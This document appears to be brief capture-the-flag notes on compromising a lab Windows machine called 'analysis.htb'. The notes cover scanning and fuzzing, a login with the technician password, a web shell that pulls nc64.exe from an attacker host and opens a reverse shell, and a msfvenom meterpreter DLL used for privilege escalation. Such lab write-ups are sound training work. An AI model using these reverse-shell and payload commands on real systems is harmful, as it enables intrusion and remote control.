![[Analysis image.png]]

Independent Challenges

- **1 Target #1 – 10.10.11.250**
- **1.1 Initial Access –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

- **1.1 Service Enumeration**

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
| 10.10.11.250 | **TCP**: |

I run rustscan to discovery open ports  in Target.

rustscan -r 1-65535 -a 10.10.11.250 -- -sV -Pn -A

![[Analysis image 1.png]]

![[Analysis image 2.png]]

![[Analysis image 3.png]]

Register the found domain name in the hosts file.

echo "10.10.11.250 analysis.htb"| tee -a  /etc/hosts

10.10.11.250 analysis.htb

![[Analysis image 4.png]]

There were so many ports open that we started investigating the prominent ones.

Web

**Browser Access**

http://analysis.htb/#!/home

![[Analysis image 5.png]]

Also check the information in Wappalizer.

![[Analysis image 6.png]]

**Directory Enumeration**

I used gobuster to investigate the directory but couldn't find anything.

gobuster dir -u http://analysis.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -s "200,301" -e -t 50 --status-codes ""

![[Analysis image 7.png]]

ffuf -c -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u "http://analysis.htb" -H "Host:FUZZ.analysis.htb" -fc 302

![[Analysis image 8.png]]

ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://internal.analysis.htb/FUZZ -recursion -recursion-depth 1 -e .php

feroxbuster -u http://internal.analysis.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

![[Analysis image 9.png]]

feroxbuster -u http://internal.analysis.htb/users/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

![[Analysis image 10.png]]

http://internal.analysis.htb/users/list.php

![[Analysis image 11.png]]

**不足しているパラメータを探索**

![[Analysis image 12.png]]

**name**

![[Analysis image 13.png]]

![[Analysis image 14.png]]

**technician**

feroxbuster -u http://internal.analysis.htb/employees/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

![[Analysis image 15.png]]

**login.php**

![[Analysis image 16.png]]

sqlmap -r req --batch --dbs

Nothing

**1.2** **Initial Access –**

**technician@analysis.htb**

97NTtl*4QP96Bv

![[Analysis image 17.png]]

![[Analysis image 18.png]]

![[Analysis image 19.png]]

![[Analysis image 20.png]]

![[Analysis image 21.png]]

http://internal.analysis.htb/dashboard/uploads/revshell.php?cmd=curl%2010.10.14.120:8000/nc64.exe%20-o%20nc64.exe%20&%20dir

![[Analysis image 22.png]]

http://internal.analysis.htb/dashboard/uploads/revshell.php?cmd=nc64.exe%2010.10.14.120%204444%20-e%20cmd

![[Analysis image 23.png]]

**Local.txt value:**ac9c3e7282ef90a5a2b3a4085f1c3943

**1.3** **Privilege Escalation -**

![[Analysis image 24.png]]

.\winPEASany.exe

![[Analysis image 25.png]]

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.120 LPORT=5555 -f dll -o sf_engine.dll

![[Analysis image 26.png]]

curl http://10.10.14.120/sf_engine.dll -o sf_engine.dll

![[Analysis image 27.png]]

**1.4** **Post Exploitation**

![[Analysis image 28.png]]

![[Analysis image 29.png]]

![[Analysis image 30.png]]

**Proof.txt value:**ce9a8eeafe97ebb35d6dda5573ce78ca